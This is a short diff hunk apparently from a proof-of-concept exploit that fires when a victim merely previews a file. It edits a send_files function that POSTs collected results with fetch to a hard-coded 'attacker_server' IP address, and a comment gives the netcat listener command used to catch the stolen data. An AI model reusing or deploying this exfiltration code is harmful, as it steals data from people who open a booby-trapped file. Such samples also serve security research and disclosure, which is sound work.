@@ -38,7 +38,7 @@ just need to preview this file to see the magic
  
     function send_files(result){ 
          // need to set netcat to listen per example nc -lvvv 55555
-         let attacker_server =  ' https://178.63.133.12'
+         let attacker_server =  ' http://178.63.133.12'
          fetch(attacker_server, {
                 method: 'post',
                 body: JSON.stringify(result)
